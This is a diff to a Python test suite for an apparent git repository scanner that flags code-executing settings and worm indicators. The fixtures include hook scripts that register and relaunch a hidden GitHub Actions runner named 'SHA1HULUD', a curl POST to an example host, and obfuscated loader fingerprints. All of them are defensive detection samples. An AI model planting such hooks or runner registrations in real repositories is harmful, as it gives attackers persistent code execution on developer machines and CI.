@@ -5,6 +5,7 @@ from __future__ import annotations
 
 import os
 import stat
+import unittest
 import uuid
 from pathlib import Path
 from unittest import mock
@@ -571,6 +572,42 @@ class TestSubmodulesAreReadInTheirOwnTree(ExecSurfaceSandbox):
         self.hook(repo / "sub", "fetch.sh", self.SCRIPT)
         self.assert_tier(repo, CONFIRMED)
 
+    def _module(self, repo: Path, config: str) -> Path:
+        self._gitmodules(repo)
+        module = repo / ".git" / "modules" / "sub"
+        module.mkdir(parents=True)
+        (module / "HEAD").write_text("ref: refs/heads/main\n")
+        (module / "config").write_text(config)
+        (repo / "sub").mkdir()
+        (repo / "sub" / ".git").write_text(f"gitdir: {module}\n")
+        return module
+
+    def test_a_command_in_the_submodules_worktree_settings(self):
+        repo = self.repo()
+        module = self._module(repo, "[extensions]\n\tworktreeConfig = true\n")
+        (module / "config.worktree").write_text("[core]\n\tfsmonitor = ./fetch.sh\n")
+        self.hook(repo / "sub", "fetch.sh", self.SCRIPT)
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_hook_in_the_submodules_hooks_path(self):
+        repo = self.repo()
+        self._module(repo, "[core]\n\thooksPath = .githooks\n")
+        self.hook(repo / "sub" / ".githooks", "post-checkout", self.SCRIPT)
+        self.assert_tier(repo, CONFIRMED)
+
+
+class TestAPathUnderGitsInstallPrefixIsNotCalledRead(ExecSurfaceSandbox):
+
+    def test_an_include(self):
+        repo = self.repo()
+        self.append_config(repo, "[include]\n\tpath = %(prefix)/etc/team.gitconfig\n")
+        self.assertIn("install prefix", self.scan(repo).error or "")
+
+    def test_a_hooks_path(self):
+        repo = self.repo()
+        self.append_config(repo, "[core]\n\thooksPath = %(prefix)/share/hooks\n")
+        self.assertIn("install prefix", self.scan(repo).error or "")
+
 
 class TestPowerShellWordsNeedPowerShell(ExecSurfaceSandbox):
     """Check `iex` outside PowerShell: a hostname, or Elixir's shell."""
@@ -658,44 +695,50 @@ class TestReadingNeverRunsTheConfiguration(ExecSurfaceSandbox):
         self.assertTrue(tiers[INFORMATIONAL])
 
 
-def _quoted(value: str) -> str:
-    return '"' + value.replace("\\", "\\\\").replace('"', '\\"') + '"'
+_RUNNER_REGISTRATION = (
+    "#!/bin/sh\nRD=$HOME/.dev-env\ncd \"$RD\" && ./config.sh --url https://github.com/o/r --unattended "
+    "--token \"$RUNNER_TOKEN\" --name \"SHA1HULUD\"\nnohup ./run.sh >/dev/null 2>&1 &\n")
+_RUNNER_RESTORED = (
+    "#!/bin/sh\nRD=$HOME/.dev-env\ncat > \"$RD/.runner\" <<'EOF'\n"
+    "{\"agentName\": \"build-agent-7\", \"serverUrl\": \"https://pipelines.actions.githubusercontent.com/x/\", "
+    "\"gitHubUrl\": \"https://github.com/o/r\", \"workFolder\": \"_work\"}\nEOF\n"
+    "cd \"$RD\" && nohup ./run.sh >/dev/null 2>&1 &\n")
 
 
-class TestAFingerprintConfirmsOnlyWhereItHolds(ExecSurfaceSandbox):
-    """A fingerprint meant for some files, or one that needs a corroborator, confirms a setting only
-    as it would confirm a file."""
+class TestAWormIndicatorInWhatGitRunsIsConfirmed(ExecSurfaceSandbox):
 
-    _MEANT_FOR_OTHER_FILES = (
-        "curl -s -X POST -d '{\"serverUrl\": \"https://ci.example.com\"}' https://hooks.example.com/n",
-        "echo TechMono",
-        "cat branch_structure.json",
-        "echo SHA1HULUD",
-        "node -e \"const DEL = String.fromCharCode(127)\"",
-    )
+    def test_a_hook_registering_the_worms_runner(self):
+        repo = self.repo()
+        self.hook(repo / ".git" / "hooks", "post-checkout", _RUNNER_REGISTRATION)
+        self.assertEqual("infected", self.assert_tier(repo, CONFIRMED)["result"].verdict)
+
+    def test_a_hook_restoring_a_runner_registration(self):
+        repo = self.repo()
+        self.hook(repo / ".git" / "hooks", "post-merge", _RUNNER_RESTORED)
+        self.assertEqual("infected", self.assert_tier(repo, CONFIRMED)["result"].verdict)
+
+
+class TestTheValueIsAKnownPayloadOnlyWhereTheFingerprintHolds(unittest.TestCase):
+    """The question the removal asks of a setting's own text."""
 
     def setUp(self):
-        super().setUp()
-        self.carries_payload = payload_check_for([s for group in load_signatures().values()
-                                                  for s in group])
+        every = [s for group in load_signatures().values() for s in group]
+        self.carries_payload = payload_check_for(every, holding_anywhere=True)
 
-    def test_a_hook_naming_text_another_files_fingerprint_matches_is_not_confirmed(self):
-        for value in self._MEANT_FOR_OTHER_FILES:
+    def test_a_fingerprint_meant_for_some_files_does_not_hold(self):
+        for value in ("echo TechMono", "cat branch_structure.json", "./config.sh --name SHA1HULUD",
+                      "curl -d '{\"serverUrl\": \"https://ci.example.com\"}' https://h.example.com"):
             with self.subTest(value=value):
-                repo = self.repo(f"repo-{uuid.uuid4().hex[:8]}")
-                self.append_config(repo, f'[hook "notify"]\n\tcommand = {_quoted(value)}\n'
-                                         '\tevent = pre-push\n')
-                self.assertEqual([], [f.evidence for f in self.graded(repo)[CONFIRMED]])
+                self.assertIsNone(self.carries_payload(value))
 
-    def test_a_fingerprint_held_to_a_corroborator_confirms_beside_it(self):
+    def test_a_fingerprint_held_to_a_corroborator_holds_only_beside_it(self):
         self.assertEqual("loader-fromcharcode-127",
                          self.carries_payload("node -e \"eval(String.fromCharCode(127)+x)\""))
         self.assertIsNone(self.carries_payload("node -e \"const DEL = String.fromCharCode(127)\""))
 
-    def test_a_fingerprint_that_holds_anywhere_still_confirms(self):
+    def test_a_fingerprint_that_holds_anywhere_holds(self):
         self.assertEqual("loader-global-v-marker", self.carries_payload("node -e \"global['_V']='8-12';\""))
 
 
 if __name__ == "__main__":
-    import unittest
     unittest.main()
